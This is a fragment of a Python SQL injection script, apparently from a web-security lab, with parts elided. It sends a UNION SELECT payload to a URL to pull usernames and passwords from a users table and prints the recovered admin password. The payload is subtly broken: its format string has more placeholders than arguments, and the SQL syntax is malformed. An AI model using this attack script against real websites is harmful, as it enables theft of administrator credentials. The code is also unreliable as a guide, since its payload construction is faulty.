...
def sqli_admin_cred(url, users_table, password_column, username_column):
    sql_payload = "' UNION SELECT %s ,%s and %s FROM %s--" %(users_table, password_column, username_column)
    res = perform_request(url, sql_payload)    
    soup = BeautifulSoup(res, 'html.parser')
...
if __name__ == '__main__':
    ...
    if  users_table:
        ...
        if username_column and password_column:
            ...
            if admin_password:
                print("[+] The admin password: %s" % admin_password)
            else:
